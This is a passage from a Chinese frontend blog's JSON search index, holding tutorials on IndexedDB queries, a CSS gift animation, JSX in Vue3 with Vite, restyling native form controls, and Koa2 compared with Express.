3~9，布尔值参数为 true 的时候不含范围边界。 查找记录 IDBObjectStore 接口的 index(name) 方法在当前对象存储中打开一个命名索引，之后它可以用于，例如，使用游标返回按该索引排序的一系列记录。 IDBObjectStore.get(key) 用于从对象储存检索特定记录，它在单独的线程中返回由指定键选择的对象储存。 IDBObjectStore.getAll(query, count) 返回对象存储中与指定参数匹配的所有对象，如果没有给出参数，则返回存储中的所有对象。 const store = db.transaction([dbName], 'readwrite').objectStore(dbName); const request = store.index(name).getAll(value); 完整代码+马上掘金 参考资料 HTML5 indexedDB前端本地存储数据库实例教程 ","link":"https://zkrisj.github.io/post/qian-duan-ben-di-cun-chu-shu-ju-ku-indexeddb-de-zeng-shan-gai-cha/"},{"title":"纯 CSS 制作一个圣诞礼物动画","content":"介绍 CSS 动画包括两个部分：描述动画的样式规则和用于指定动画开始、结束以及中间点样式的关键帧。相较于传统的脚本实现动画技术，使用 CSS 动画有三个主要优点： 能够非常容易地创建简单动画，你甚至不需要了解 JavaScript 就能创建动画。 动画运行效果良好，甚至在低性能的系统上。渲染引擎会使用跳帧或者其他技术以保证动画表现尽可能的流畅。而使用 JavaScript 实现的动画通常表现不佳（除非经过很好的设计）。 让浏览器控制动画序列，允许浏览器优化性能和效果，如降低位于隐藏选项卡中的动画更新频率。 创建动画序列，需要使用 animation 属性或其子属性，该属性允许配置动画时间、时长以及其他动画细节，但该属性不能配置动画的实际表现，动画的实际表现是由 @keyframes 规则实现。通过使用 @keyframes 建立两个或两个以上关键帧来实现动画。每一个关键帧都描述了动画元素在给定的时间点上应该如何渲染。动画的时间设置是通过 CSS 样式定义的，关键帧使用 percentage 来指定动画发生的时间点。0% 表示动画的第一时刻，100% 表示动画的最终时刻，这两个时间点十分重要，所以还有特殊的别名：from 和 to，若 from/0% 或 to/100% 未指定，则浏览器使用计算值开始或结束动画。也可包含 0%-100% 之间的关键帧，描述动画开始和结束之间的状态。 圣诞节即将到来，Codepen 上面大佬使用纯 CSS 制作了一个圣诞礼物动画，效果如下： 定义使用的 CSS 变量 :root { --red1: hsl(345, 100%, 48%); --red2: hsl(345, 100%, 38%); --white1: hsl(0, 0%, 100%); --white2: hsl(0, 0%, 90%); --blue: hsl(120, 100%, 20%); } --red1：系带的颜色。 --red2：系带的阴影颜色。 -white1：盒子的颜色。 -white2：盒子的阴影颜色。 --blue：页面的背景颜色。 添加礼物容器、盒子和盒盖元素 &lt;div class=&quot;gift&quot;&gt; &lt;div class=&quot;gift__box&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__lid&quot;&gt;&lt;/div&gt; &lt;/div&gt; 然后，在盒子元素上面加上盒盖的阴影元素： &lt;div class=&quot;gift__box&quot;&gt; &lt;div class=&quot;gift__lid-shadow&quot;&gt;&lt;/div&gt; &lt;/div&gt; 设置礼物盒子、盒盖阴影、盒盖元素样式，盒子和盒盖上面的系带条纹由 linear-gradient 函数实现： body { background-color: var(--blue); color: var(--white1); font: 1em/1.5 sans-serif; height: 100vh; display: grid; place-items: center; margin: 0; } .gift { position: relative; width: 18em; height: 18em; } .gift__box, .gift__lid, .gift__lid-shadow { position: absolute; } .gift__box, .gift__lid, .gift__lid-shadow { transform-origin: 50% 100%; } .gift__box { background: linear-gradient(var(--red2), var(--red2)) 50% 50% / 3.3em 100% no-repeat, var(--white2); border-radius: 1.5em; bottom: 0.5em; left: 3.3em; overflow: hidden; width: 11.4em; height: 9em; } .gift__lid, .gift__lid-shadow { border-radius: 1em; width: 13em; height: 3.3em; } .gift__lid { background: linear-gradient(var(--red1), var(--red1)) 50% 50% / 3.3em 100% no-repeat, var(--white1); bottom: 8.7em; left: 2.5em; } .gift__lid-shadow { background-color: hsla(0, 0%, 0%, 0.1); top: -1.5em; left: -1em; } 现在我们实现了礼物盒子和它的盒盖的形状： 添加系带元素 接下来我们给礼物盒子添加一个蝴蝶结系带，系带分为系带容器和左边、中间、右边元素。 &lt;div class=&quot;gift__bow&quot;&gt; &lt;div class=&quot;gift__bow-left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__bow-right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__bow-center&quot;&gt;&lt;/div&gt; &lt;/div&gt; 设置样式，使用 CSS clip-path 属性设置蝴蝶结形状： .gift__bow, .gift__bow-center, .gift__bow-left, .gift__bow-right { position: absolute; } .gift__bow-center, .gift__bow-left, .gift__bow-right { background-color: var(--red2); } .gift__bow { bottom: 11em; left: 7.5em; width: 3em; height: 2em; transform-origin: 50% 230%; } .gift__bow-center { border-radius: 1em; width: 100%; height: 100%; } .gift__bow-left, .gift__bow-right { box-shadow: 0 0 0 0.7em var(--red1) inset; top: 0.3em; width: 4em; height: 5em; z-index: -1; } .gift__bow-left:before, .gift__bow-right:before { background-color: var(--red1); border-radius: inherit; content: &quot;&quot;; display: block; position: absolute; inset: 0; } .gift__bow-left { border-radius: 1.5em 0 3em 1em / 1.5em 0 3em 3.5em; right: calc(100% - 0.75em); transform: rotate(35deg); transform-origin: 100% 15%; } .gift__bow-left:before { clip-path: polygon(0 42%, 100% 12%, 100% 100%, 0 100%); } .gift__bow-right { border-radius: 0 1.5em 1em 3em / 0 1.5em 3.5em 3em; left: calc(100% - 0.75em); transform: rotate(-35deg); transform-origin: 0% 15%; } .gift__bow-right:before { clip-path: polygon(0 12%, 100% 42%, 100% 100%, 0 100%); } 现在已经实现了一个完整的礼物图片了： 添加 CSS 动画 设置动画时长 CSS 变量，分别给礼物盒子、盒盖阴影、盒盖元素、系带容器和左边、右边元素添加 CSS 动画： .gift { --dur: 1.5s; } .gift__bow { animation: bowBounce var(--dur) ease-in-out infinite; } .gift__bow-left { animation: bowLeftPivot var(--dur) ease-in-out infinite; } .gift__bow-right { animation: bowRightPivot var(--dur) ease-in-out infinite; } .gift__box { animation: boxBounce var(--dur) ease-in-out infinite; } .gift__lid { animation: lidBounce var(--dur) ease-in-out infinite; } .gift__lid-shadow { animation: lidShadowBounce var(--dur) ease-in-out infinite; } @keyframes bowBounce { from, 50% { transform: translateY(0) rotate(0); } 62.5% { animation-timing-function: ease-in; transform: translateY(75%) rotate(0); } 68.75% { animation-timing-function: ease-out; transform: translateY(-37.5%) rotate(15deg); } 75% { animation-timing-function: ease-in-out; transform: translateY(-150%) rotate(5deg); } 87.5% { transform: translateY(65%) rotate(-3deg); } to { transform: translateY(0) rotate(0); } } @keyframes bowLeftPivot { from, 50% { transform: rotate(35deg); } 62.5% { transform: rotate(45deg); } 75% { transform: rotate(30deg); } 87.5% { transform: rotate(45deg); } to { transform: rotate(35deg); } } @keyframes bowRightPivot { from, 50% { transform: rotate(-35deg); } 62.5% { transform: rotate(-45deg); } 75% { transform: rotate(-34deg); } 87.5% { transform: rotate(-45deg); } to { transform: rotate(-35deg); } } @keyframes boxBounce { from, 50% { transform: translateY(0) scale(1, 1); } 62.5% { transform: translateY(4%) scale(1.12, 0.89); } 75% { transform: translateY(-11%) scale(0.92, 1.1); } 87.5% { transform: translateY(0) scale(1.05, 0.9); } to { transform: translateY(0) scale(1, 1); } } @keyframes lidBounce { from, 50% { transform: translateY(0) scale(1, 1) rotate(0); } 62.5% { animation-timing-function: ease-in; transform: translateY(45%) scale(1.14, 0.95) rotate(0); } 68.75% { animation-timing-function: ease-out; transform: translateY(-22.5%) scale(1.05, 1.03) rotate(15deg); } 75% { animation-timing-function: ease-in-out; transform: translateY(-90%) scale(0.96, 1.1) rotate(5deg); } 87.5% { transform: translateY(30%) scale(1.12, 0.93) rotate(-3deg); } to { transform: translateY(0) scale(1, 1) rotate(0); } } @keyframes lidShadowBounce { from, 50% { transform: translateY(0) scale(1, 1) rotate(0); } 62.5% { animation-timing-function: ease-in; transform: translateY(10%) scale(1.14, 0.95) rotate(0); } 68.75% { animation-timing-function: ease-out; transform: translateY(-10%) scale(1.05, 1.03) rotate(15deg); } 75% { animation-timing-function: ease-in-out; transform: translateY(-30%) scale(0.96, 1.1) rotate(5deg); } 87.5% { transform: translateY(10%) scale(1.12, 0.93) rotate(-3deg); } to { transform: translateY(0) scale(1, 1) rotate(0); } } 现在我们已经完成了一个完整的礼物图片和循环的弹起动画了，为了让圣诞礼物看起来更炫酷、崭新的样子，可以添加几个闪烁的星星来衬托这个圣诞礼物。 &lt;div class=&quot;gift__star gift__star--1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__star gift__star--2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__star gift__star--3&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__star gift__star--4&quot;&gt;&lt;/div&gt; &lt;div class=&quot;gift__star gift__star--5&quot;&gt;&lt;/div&gt; 使用 CSS clip-path 属性设置五角星形状： .gift__star { animation: starRotateCW var(--dur) ease-in infinite; background-color: var(--white1); clip-path: polygon(50% 0, 65% 35%, 100% 50%, 65% 65%, 50% 100%, 35% 65%, 0 50%, 35% 35%); transform: scale(0); } .gift__star--2, .gift__star--4, .gift__star--5 { animation-name: starRotateCCW; } .gift__star--1 { animation-delay: calc(var(--dur) * 0.5); top: 0; left: 12.5em; width: 1.5em; height: 1.5em; } .gift__star--2 { animation-delay: calc(var(--dur) * 0.125); top: 2em; left: 10em; width: 1.75em; height: 1.75em; } .gift__star--3 { animation-delay: calc(var(--dur) * 0.25); top: 8em; left: 0; width: 1.25em; height: 1.25em; } .gift__star--4 { top: 10.5em; right: 0; width: 1.75em; height: 1.75em; } .gift__star--5 { animation-delay: calc(var(--dur) * 0.375); top: 12em; left: 1.8em; width: 2.5em; height: 2.5em; } 添加五角星闪烁的动画： @keyframes starRotateCW { from { transform: scale(0) rotate(0); } 25% { animation-timing-function: ease-out; transform: scale(1) rotate(0.25turn); } 50%, to { transform: scale(0) rotate(0.5turn); } } @keyframes starRotateCCW { from { transform: scale(0) rotate(0); } 25% { animation-timing-function: ease-out; transform: scale(1) rotate(-0.25turn); } 50%, to { transform: scale(0) rotate(-0.5turn); } } 完整代码+马上掘金 ","link":"https://zkrisj.github.io/post/chun-css-zhi-zuo-yi-ge-sheng-dan-li-wu-dong-hua/"},{"title":"长文，Vue3+Vite 中 JSX 的使用方式","content":"介绍 JSX（JavaScript 和 XML），是一个 HTML-in-JavaScript 的语法扩展，首先在 React 中被进入。JSX 可以很好地描述 UI 应该呈现出它应有交互的本质形式。JSX 是在 JavaScript 语法上的拓展，因此类似于 HTML 的代码可以和 JS 共存。例如： const button = &lt;MyButton color=&quot;blue&quot; shadowSize={2}&gt; Click Me &lt;/MyButton&gt; 该 button 常量称为 JSX 表达式。可以使用它在我们的应用程序中渲染 &lt;MyButton&gt; 标签。浏览器是无法读取直接解析 JSX 的。JSX 表达式经过（ Babel 或 Parcel 之类的工具）编译之后是这样的： React.createElement( MyButton, {color: 'blue', shadowSize: 2}, 'Click Me' ) 实际上，JSX 仅仅只是 React.createElement(component, props, ...children) 函数的语法糖。可以使用 React.createElement() 自己编写 UI 来跳过编译步骤。但是，这样做会失去 JSX 的声明性优势，并且代码变得更难以阅读。编译是开发过程中的一个额外步骤，但是 React 社区中的许多开发人员都认为 JSX 的可读性值得。另外，流行的工具使 JSX-to-JavaScript 编译成为其设置过程的一部分。除非您愿意，否则不必自己配置编译。如果你想测试一些特定的 JSX 会转换成什么样的 JavaScript，你可以尝试使用 在线的 Babel 编译器。 React 并不强制要求使用 JSX。当你不想在构建环境中配置有关 JSX 编译时，不在 React 中使用 JSX 会更加方便。例如，用 JSX 编写的代码： class Hello extends React.Component { render() { return &lt;div&gt;Hello {this.props.toWhat}&lt;/div&gt;; } } const root = ReactDOM.createRoot(document.getElementById('root')); root.render(&lt;Hello toWhat=&quot;World&quot; /&gt;); 可以编写为不使用 JSX 的代码： class Hello extends React.Component { render() { return React.createElement('div', null, `Hello ${this.props.toWhat}`); } } const root = ReactDOM.createRoot(document.getElementById('root')); root.render(React.createElement(Hello, {toWhat: 'World'}, null)); 在 Vue3 中使用 JSX Vue 使用单文件组件，把 template 模板、相关脚本和 CSS 一起整合放在 .vue 结尾的一个单文件中。这些文件最终会通过 JS 打包或构建工具（例如 Webpack、Vite）处理。 &lt;template&gt; 元素包含了所有的标记结构和组件的展示逻辑。template 可以包含任何合法的 HTML，以及 Vue 特定的语法。通过设置 &lt;template&gt; 标签的 lang 属性，例如可以通过设置 &lt;template lang=&quot;pug&quot;&gt; 就可以在使用 Pug 模板来替代标准 HTML。 而 .vue 文件中的 &lt;script&gt; 标签包含组件中所有的非显示逻辑，并且需要默认导出一个 JS 对象。该对象是在本地注册组件、定义属性、处理本地状态、定义方法等的地方。在构建阶段这个包含了 template 模板的对象会被处理和转换成为一个有 render() 函数的 Vue 组件。 组件的 CSS 样式写在 &lt;style&gt; 标签里，如果添加了 scoped 属性，Vue 会把样式的范围限制到单文件组件的内容里。这是类似于 CSS-in-JS 的解决方案，只不过允许书写纯粹的 CSS。如果通过 CLI 创建项目时选择了 CSS 预处理器，则可以将 lang 属性添加到 &lt;style&gt; 标签中，以便 Webpack 可以在构建时处理内容。 虽然 jsx 最早是由 React 引入，但实际上 JSX 语法并没有定义运行时语义，并且能被编译成各种不同的输出形式。如果你之前使用过 JSX 语法，那么请注意 Vue 的 JSX 编译方式与 React 中 JSX 的编译方式不同，因此不能在 Vue 应用中使用 React 的 JSX 编译。与 React JSX 语法的一些明显区别包括： 可以使用 HTML attributes 比如 class 和 for 作为 props - 不需要使用 className 或 htmlFor。 传递子元素给组件 (比如 slots) 的方式不同。 Vue 的类型定义也提供了 TSX 语法的类型推导支持。当使用 TSX 语法时，确保在 tsconfig.json 中配置了 &quot;jsx&quot;: &quot;preserve&quot;，这样的 TypeScript 就能保证 Vue JSX 语法编译过程中的完整性。 安装插件（@vitejs/plugin-vue-jsx） vite 官方提供了官方的插件来支持在 vue3 中使用 jsx/tsx，直接安装就行。 npm i @vitejs/plugin-vue-jsx -D 安装完之后在 vite.config.js 文件中的 plugins 字段中添加 jsx 支持： import vueJsx from &quot;@vitejs/plugin-vue-jsx&quot;; export default defineConfig({ plugins: [ vueJsx(), ] }) 这样就可以在项目中使用 jsx/tsx 了。 新建 jsx 文件 在项目中新建 jsx 或 tsx 后缀的文件，语法和 js 文件类似，但是和 .vue 文件中的 &lt;script&gt; 标签一样，jsx 文件模块需要默认导出一个 JS 对象。该对象用来在本地注册组件、定义属性、处理本地状态、定义方法等。 import HelloWorld from './HelloWorld.vue' export default { setup() { return () =&gt; &lt;HelloWorld msg=&quot;11&quot; /&gt;; }, }; 语法 插值。与 vue 模板语法中的插值一样，但是双大括号 {{}} 变为了单大括号 {}。大括号内支持任何有效的 JavaScript 表达式，比如：2 + 2，user.firstName，formatName(user) 等。 // 模板语法 &lt;span&gt;{{ a + b }}&lt;/span&gt; // jsx/tsx &lt;span&gt;{ a + b }&lt;/span&gt; class 类名绑定。有两种方式，使用模板字符串或者使用数组。 // 模板字符串 &lt;div className={ `header ${ isBg ? 'headerBg' : '' }` }&gt;header&lt;/div&gt; // 数组 &lt;div class={ [ 'header', isBg &amp;&amp; 'headerBg' ] } &gt;header&lt;/div&gt; style 样式绑定。需要使用双大括号。 const color = 'red' const element = &lt;sapn style={{ color, fontSize: '16px' }}&gt;style&lt;/sapn&gt; 条件渲染。由于 jsx 本身具有 js 语法，所以不再需要使用 v-if 指令，使用 if/else 和三元表达式都可以实现。但是支持 v-show 指令。 const element = (name) =&gt; { if (name) { return &lt;h1&gt;Hello, { name }&lt;/h1&gt; } else { return &lt;h1&gt;Hello, Stranger&lt;/h1&gt; } } const element = icon ? &lt;span class=&quot;icon&quot;&gt;&lt;/span&gt; : null; // 以上代码等效于： const element = icon &amp;&amp; &lt;span class=&quot;icon&quot;&gt;&lt;/span&gt;; 列表渲染。同样，由于 jsx 本身具有 js 语法，所以不再需要使用 v-for 指令，使用 JS 数组的 map 方法即可。 const listData = [ {name: 'Tom', age: 18}, {name: 'Jim', age: 20}, {name: 'Lucy', age: 16} ] return () =&gt; ( &lt;div&gt; &lt;div class={'box'}&gt; &lt;span&gt;姓名&lt;/span&gt; &lt;span&gt;年龄&lt;/span&gt; &lt;/div&gt; { prop.listData.map(item =&gt; &lt;div class={'box'}&gt; &lt;span&gt;{item.name}&lt;/span&gt; &lt;span&gt;{item.age}&lt;/span&gt; &lt;/div&gt; }) &lt;/div&gt; ) 标签属性绑定。也是使用大括号包裹，不能使用 v-bind 指令。而 vue 组件中通过 &lt;div v-bind=&quot;properties&quot;&gt;&lt;/div&gt; 批量绑定标签属性，在 JSX 中需要使用 &lt;div {...properties}&gt;&lt;/div&gt;。 const href = 'https://cn.vuejs.org/' const element = &lt;a href={href}&gt;Vue3&lt;/a&gt; 事件绑定。使用的也是 单大括号 {}，不过事件绑定不是以 @为前缀了，而是改成了 on，与原生相同。例如：click 事件是 onClick 或 onclick。 const confirm = () =&gt; { // 确认提交 } &lt;button onClick={confirm}&gt;确定&lt;/button&gt; 如果要带参数，需要使用箭头函数进行包裹： const confirm = (name) =&gt; { // 确认提交 } &lt;button onClick={() =&gt; confirm('Are you sure')}&gt;确定&lt;/button&gt; 事件修饰符。需要使用 withModifiers 方法，接收两个参数，第一个参数是绑定的事件，第二个参数是需要使用的事件修饰符。 import { withModifiers, defineComponent, ref } from 'vue' const App = defineComponent({ setup() { const count = ref(0); const inc = () =&gt; { count.value++; }; return () =&gt; ( &lt;div onClick={ withModifiers(inc, ['self']) }&gt;{ count.value }&lt;/div&gt; ); }, }) export default App 注意：Vue 模板中 ref 变量是可以直接解构的，但是在 jsx 中不行，需要添加 .value，比如上面的 { count.value }。 v-model 双向绑定。需要使用单大括号 {}。如果绑定属性则需要一个数组，第一个元素为绑定的值，第二个元素为绑定的属性。 // 绑定值 &lt;input v-model=&quot;show&quot; /&gt; // vue &lt;input v-model={show.value} /&gt; // jsx // 绑定属性 &lt;input v-model:prop=&quot;show&quot; /&gt; // vue &lt;input v-model={[show.value,'prop']} /&gt; // jsx // 修饰符写法 &lt;input v-model:prop.trim=&quot;show&quot; /&gt; // vue &lt;input v-model={[show.value,'prop',['trim']]} /&gt; // jsx slot 插槽。jsx/tsx 中无法使用 slot 标签，定义插槽方式一：通过 setup 函数的第一个参数 ctx 上下文对象的 slots 的属性，setup 函数默认接收两个参数： props - 组件传入的参数对象。 ctx - 上下文对象，上下文对象暴露了其他一些在 setup 中可能会用到的值，包括： attrs - 透传的 Attributes（非响应式的对象，等价于 $attrs）。 slots - 插槽（非响应式的对象，等价于 $slots）。 emit - 触发事件的函数（等价于 $emit）。 expose - 暴露公共属性的函数。 如果解构了 props 对象，解构出的变量将会丢失响应性，因此推荐通过 props.xxx 的形式来使用其中的 props。如果确实需要解构 props 对象，或者需要将某个 prop 传到一个外部函数中并保持响应性，可以使用 toRefs() 和 toRef() 这两个工具函数： import { toRefs, toRef } from 'vue' export default { setup(props) { // 将 `props` 转为一个其中全是 ref 的对象，然后解构 const { title } = toRefs(props) // `title` 是一个追踪着 `props.title` 的 ref console.log(title.value) // 或者，将 `props` 的单个属性转为一个 ref const title = toRef(props, 'title') } } ctx 上下文对象是非响应式的，可以安全地解构： export default { setup(props, { attrs, slots, emit, expose }) { ... } } attrs 和 slots 都是响应式（有状态）的对象，它们总是会随着组件自身的更新而更新。这意味着你应当避免解构它们，并始终通过 attrs.x 或 slots.x 的形式使用其中的属性。此外，和 props 不同，attrs 和 slots 的属性都不是响应式的。如果想要基于 attrs 或 slots 的改变来执行副作用，那么应该在 onBeforeUpdate 生命周期钩子中编写相关逻辑。 expose 函数用于显式地限制该组件暴露出的属性，当父组件通过模板引用访问该组件的实例时，将仅能访问 expose 函数暴露出的内容： export default { setup(props, { expose }) { // 让组件实例处于 “关闭状态” // 即不向父组件暴露任何东西 expose() const publicCount = ref(0) const privateCount = ref(0) // 有选择地暴露局部状态 expose({ count: publicCount }) } } 通过 ctx 上下文对象的 slots 的属性获取插槽对象后，就可以定义插槽了。 import { defineComponent } from 'vue' export default defineComponent({ setup(props, { slots }) { // 逻辑 return () =&gt; { return &lt;p&gt; &lt;button&gt;{ slots.test?.() }&lt;/button&gt; &lt;button&gt;{ slots.default?.() }&lt;/button&gt; &lt;/p&gt; } }, }) // 在引用的组件中 &lt;template #test&gt;slot-test&lt;/template&gt; &lt;template #&gt;slot-default&lt;/template&gt; 定义插槽方式二：使用 renderSlot 函数。 import { renderSlot } from 'vue' &lt;button&gt; { renderSlot(slots, 'default') } &lt;/button&gt; 而如果在 jsx 中使用插槽，可以直接通过标签属性 slot，或通过 v-slots 指令。 import HelloWorld from './HelloWorld' export default defineComponent({ setup() { return () =&gt; &lt;div class={'box'}&gt; &lt;HelloWorld v-slots={{ title: () =&gt; { return &lt;p&gt;我是title插槽&lt;/p&gt; }, default: () =&gt; { return &lt;p&gt;我是default插槽&lt;/p&gt; } }} /&gt; &lt;/div&gt; } }) CSS Modules。引入局部样式，相当于 vue 组件中 &lt;style&gt; 标签的 scoped 属性。 import styles from './index.module.scss' &lt;div class={styles.wrap}&gt;&lt;/div&gt; GitHub 源码 Vue3 中自定义组件 参考资料 在 vue3 中优雅的使用 jsx/tsx ","link":"https://zkrisj.github.io/post/chang-wen-vue3vite-zhong-jsx-de-shi-yong-fang-shi/"},{"title":"✏️修改常见的原生表单控件的默认样式","content":"介绍 HTML 原生的表单控件样式在各个浏览器上面由用户代理默认设置样式，如果在页面上应用了其他颜色或主题时，我们通常也相应的更改这些输入框或按钮的颜色或背景，否则会出现颜色与背景或主题不融入的样式不一致问题。 一般而言，HTML 中表单控件的效果都是通过浏览器的 Shadow Dom 创建的，脱离文档主树，不受大环境 CSS 影响，要控制其 UI 只能使用浏览器开发的伪元素 API 接口。并且，只有部分的样式可以重置。而其余的默认样式我们是无法使用浏览器自带的开发工具查看到的，因为其并不属于文档树，只是背后的一棵子树。 针对特定表单控件，浏览器提供了特定的伪元素用来改变样式。 input[type=search] 有如下 2 个伪元素可以改变搜索控件的 UI： ::-webkit-search-cancel-button - 搜索框右边的清除按钮，用来清除输入内容，在有内容时才显示。 ::-webkit-search-results-button - 搜索框左边的菜单按钮，用来显示历史记录，现在浏览器已经不显示了。 input[type=number] 有如下伪元素可以改变数字控件的 UI： ::-webkit-textfield-decoration-container – 填写数值的外部容器。 ::-webkit-inner-spin-button – 上下箭头。 input[type=range] 有如下 2 个伪元素可以改变滑块控件的 UI： ::-webkit-slider-runnable-track - 滑块凹槽，也就是滑块可滑动的区域。 ::-webkit-slider-thumb - 滑块的具体样式，该伪类需要配合 ::-webkit-slider-runnable-track 使用，否则会没有效果。 input[type=color] 有如下 2 个伪元素可以改变颜色选择控件的 UI： ::-webkit-color-swatch-wrapper - 颜色选择控件的容器元素。 ::-webkit-color-swatch - 颜色选择控件的指示颜色。 input[type=date] 有如下 8 个伪元素可以改变日期控件的 UI： ::-webkit-datetime-edit – 控制编辑区域。 ::-webkit-datetime-edit-fields-wrapper – 控制年月日这个区域。 ::-webkit-datetime-edit-text – 控制年月日之间的斜线或短横线。 ::-webkit-datetime-edit-month-field – 控制月份。 ::-webkit-datetime-edit-day-field – 控制日期。 ::-webkit-datetime-edit-year-field – 控制年份。 ::-webkit-inner-spin-button – 控制上下小箭头。 ::-webkit-calendar-picker-indicator – 控制下拉小箭头。 单选框、复选框、下拉框、文件选择框 单选框、复选框、下拉框控件的样式修改参见：如何更简单地修改单选框、复选框、下拉框的样式 文件选择框控件的样式修改参见：如何更简单地更改 input type=file 文件选择框的样式 meter 用做测量值、评分等。有如下伪元素可用： ::-webkit-meter-bar – 背景。 ::-webkit-meter-optimum-value – 得分好的时候那部分区域状态。 ::-webkit-meter-suboptimal-value – 分数凑合的时候区域状态。 ::-webkit-meter-even-less-good-value – 分数糟糕的时候区域状态。 progress 用来显示一项任务的完成进度。有如下伪元素可用： ::-webkit-progress-inner-element – 选择 &lt;progress&gt; 元素。 ::-webkit-progress-bar – 背景进度条。 ::-webkit-progress-value – 完成进度条。 其中，::-webkit-progress-bar 是::-webkit-progress-inner-element 伪元素的子元素，同时是 ::-webkit-progress-value 伪元素的父元素。 参考资料 伪元素表单控件默认样式重置与自定义大全 ","link":"https://zkrisj.github.io/post/xiu-gai-chang-jian-de-yuan-sheng-biao-dan-kong-jian-de-mo-ren-yang-shi/"},{"title":"如何修改单选框、复选框、下拉框的默认样式","content":"介绍 HTML 原生的单选框、复选框元素样式在各个浏览器上面由用户代理默认设置样式，如果在页面上应用了其他颜色或主题时，我们通常也相应的更改这些输入框或按钮的颜色或背景，否则会出现颜色与背景或主题不融入的样式不一致问题。 appearance 通常的做法是使用 display: none、绝对定位或隐藏它们，然后使用 :before 或 :after 伪元素实现样式。 从 Chrome 83 开始支持的 appearance CSS 属性提供了更有效的用于控制基于操作系统主题的 UI 控件的原生外观的方法。目前，除了 IE，其他浏览器都已支持，兼容性很好。 单选框 &lt;body&gt; &lt;label&gt; &lt;input type=&quot;radio&quot; name=&quot;contact&quot; value=&quot;email&quot; checked&gt;Email &lt;/label&gt; &lt;label&gt; &lt;input type=&quot;radio&quot; name=&quot;contact&quot; value=&quot;phone&quot;&gt;Phone &lt;/label&gt; &lt;label&gt; &lt;input type=&quot;radio&quot; name=&quot;contact&quot; value=&quot;mail&quot;&gt;Mail &lt;/label&gt; &lt;/body&gt; &lt;style&gt; input[type=radio] { appearance: none; border-radius: 50%; width: 16px; height: 16px; border: 2px solid #999; transition: 0.2s all linear; margin-right: 5px; vertical-align: top; } input[type=radio]:checked { border: 6px solid black; } &lt;/style&gt; 复选框 &lt;body&gt; &lt;label class=&quot;label&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;i class=&quot;check&quot;&gt;&lt;/i&gt; &lt;span&gt;Apple&lt;/span&gt; &lt;/label&gt; &lt;label class=&quot;label&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;i class=&quot;check&quot;&gt;&lt;/i&gt; &lt;span&gt;Banana&lt;/span&gt; &lt;/label&gt; &lt;label class=&quot;label&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;i class=&quot;check&quot;&gt;&lt;/i&gt; &lt;span&gt;Pear&lt;/span&gt; &lt;/label&gt; &lt;/body&gt; &lt;style&gt; .label { display: inline-flex; align-items: center; margin: 1em .5em; } .label input[type=checkbox] { appearance: none; } .label input[type=checkbox]+.check { width: .5em; height: .5em; margin-right: .5em; border: solid black; transition: .2s; } .label input[type=checkbox]:checked+.check { height: .2em; border-top: transparent; border-right: transparent; transform: rotate(-45deg); } &lt;/style&gt; 下拉框 &lt;select&gt; 元素的内部结构复杂，难以控制，所以很难用 CSS 进行高效的设计，但可以像其他元素一样改变某些方面——例如，调整 盒模型、显示的字体等，还可以使用 appearance 属性来去除默认的系统外观。如果要实现自定义 &lt;select&gt; 元素，可以考虑使用第三方 UI 库，或者尝试使用非语义元素和 JavaScript 来制作下拉菜单，再使用 WAI-ARIA 来提供语义。 accent-color 从 Chrome 93 开始支持的 CSS accent-color 属性提供了更简单的修改表单控件的样式的方法，它可以在不改变浏览器默认表单组件基本样式的前提下重置组件的颜色。目前支持下面这些 HTML 控件元素： &lt;input type=&quot;checkbox&quot;&gt; &lt;input type=&quot;radio&quot;&gt; &lt;input type=&quot;range&quot;&gt; &lt;progress&gt; 并且，accent-color 属性具有继承性，只需要在对应表单控件元素的祖先元素上设置，响应的控件的颜色就会发生变化。 参考资料 如何构建表单小工具 ","link":"https://zkrisj.github.io/post/ru-he-xiu-gai-dan-xuan-kuang-fu-xuan-kuang-xia-la-kuang-de-mo-ren-yang-shi/"},{"title":"Koa2 和 Express 的使用对比","content":"介绍 服务器端 Web 框架用来：从数据库中获取数据然后显示到一个页面中、确认用户输入的数据以及保存到一个数据库中、检查用户的权限、登陆用户、路由跳转等。 Express Express 是目前最流行的 NodeJS Web 框架（基于使用 Express 的 知名企业 的数量、维护代码库的人数），也是许多其它流行 NodeJS 框架的底层库。它提供了以下机制： 为不同 URL 路径中使用不同 HTTP 动词的请求（路由）编写处理程序。 集成了“视图”渲染引擎，以便通过将数据插入模板来生成响应。 设置常见 web 应用设置，比如用于连接的端口，以及渲染响应模板的位置。 在请求处理管道的任何位置添加额外的请求处理“中间件”。 Koa 虽然 Express 的 API 很简单，但是它是基于 ES5 的语法，要实现异步，需要回调。如果异步嵌套层次过多，代码会变得很臃肿。NodeJs 开始支持 ES6 后，Express 的原班团队又基于 ES6 的 Generator 语法重新编写了 Koa 1.0。使用 generator 语法实现异步，类似于下面： var koa = require('koa'); var app = koa(); app.use('/test', function *() { yield doReadFile1(); var data = yield doReadFile2(); this.body = data; }); app.listen(3000); NodeJs 开始支持 async 和 await 语法后，Koa 团队又基于 Promise 和 async 和 await 语法改写为 Koa2，所以需要 node v7.6.0 以上版本支持。Koa 因为没有捆绑中间件，所以保持了一个很小的体积。 使用对比 发送信息。与 Express 函数创建不同，Koa 需要通过 new 来创建。 Koa 提供了一个 Context 对象，表示一次对话的上下文，它将 node 的 request 和 response 对象封装到单个对象中，通过它来操作 HTTP 请求和响应。 ctx.app 为应用程序实例引用。 ctx.req 为 Node 的 request 对象。 ctx.res 为 Node 的 response 对象。 ctx.request 为 koa 的 Request 对象。 ctx.response 为 koa 的 Response 对象。 绕过 Koa 的 response 处理是不被支持的，例如： res.statusCode res.writeHead() res.write() res.end() 其中，ctx.type 和 ctx.body 分别是 ctx.response.type 和 ctx.response.body 的别名。 const express = require('express'); const app = express(); app.all('*', (req, res) =&gt; { res.type('xml'); res.send('&lt;data&gt;Hello World&lt;/data&gt;'); }).listen(8080, 'localhost'); const Koa = require('koa'); const app2 = new Koa(); app2.use((ctx) =&gt; { ctx.type = 'xml'; ctx.body = '&lt;data&gt;Hello World&lt;/data&gt;'; }).listen(3000, 'localhost'); 地址（简单路由）。网站一般都有多个页面，所以常常需要地址的切换。其中，ctx.path 是 